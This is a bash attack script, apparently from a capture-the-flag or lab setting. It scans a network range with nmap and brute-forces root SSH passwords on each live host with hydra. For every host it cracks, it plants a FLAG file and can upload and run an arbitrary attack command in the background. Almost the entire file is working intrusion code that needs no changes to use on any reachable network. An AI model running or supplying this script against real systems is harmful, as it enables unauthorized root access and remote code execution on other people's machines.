#!/bin/bash

LOG_HYDRA_FNAME='log_hydra.txt'

# Get target network from CLI argument or environment variable
TARGET_NETWORK="${1:-$TARGET_NETWORK}"

if [ -z "$TARGET_NETWORK" ]; then
  echo "[-] No target network specified via argument or TARGET_NETWORK env var"
  echo "[-] Usage: $0 <CIDR> [or set TARGET_NETWORK env var]"
  exit 1
fi

echo "[+] Scanning target network: $TARGET_NETWORK"
echo "[+] Discovering live hosts with nmap..."

# Discover live hosts using nmap
LIVE_HOSTS=$(nmap -sn "$TARGET_NETWORK" | grep "Nmap scan report for" | awk '{print $NF}')

if [ -z "$LIVE_HOSTS" ]; then
  echo "[-] No live hosts found in $TARGET_NETWORK"
  exit 1
fi

echo "[+] Found live hosts: $LIVE_HOSTS"

# Password list to use
PASSWORD_LIST="${PASSWORD_LIST:-10000_common_passwords}"

for TARGET_IP in $LIVE_HOSTS; do
  echo "=========================================="
  echo "[+] Starting hydra brute force for $TARGET_IP"
  echo "=========================================="
  
  # Run hydra and redirect output to the log file
  hydra -l root -P "$PASSWORD_LIST" -s 22 -f "$TARGET_IP" ssh &> "$LOG_HYDRA_FNAME"

  if ! grep -q ERROR "$LOG_HYDRA_FNAME"; then
    SSH_PASSWORD=$(cat $LOG_HYDRA_FNAME | grep -oP 'password: \K.*')
    if [ -n "$SSH_PASSWORD" ]; then
      echo "[+] Found password for $TARGET_IP: $SSH_PASSWORD"
      echo "$SSH_PASSWORD" > FLAG
      
      # Copy FLAG to target
      sshpass -p "$SSH_PASSWORD" scp -o StrictHostKeyChecking=no FLAG root@$TARGET_IP:/FLAG
      
      # Create attack command file if ATTACK_CMD is set
      if [ -n "$ATTACK_CMD" ]; then
        FILE_ATTACK_CONTENT="#!/bin/bash\n\n${ATTACK_CMD} &\ndisown %1\n"
        echo -e "$FILE_ATTACK_CONTENT" > file_attack_cmd.sh
        sshpass -p "$SSH_PASSWORD" scp -o StrictHostKeyChecking=no file_attack_cmd.sh root@$TARGET_IP:/file_attack_cmd.sh
        
        # Execute the attack command via ssh
        sshpass -p "$SSH_PASSWORD" ssh -o StrictHostKeyChecking=no root@$TARGET_IP "bash /file_attack_cmd.sh" &
      fi
    else
      echo "[-] No password found in hydra output for $TARGET_IP"
    fi
  else
    echo "[-] Errors occurred during hydra attack on $TARGET_IP"
  fi
  
  echo ""
done

echo "[+] Attack sequence completed"
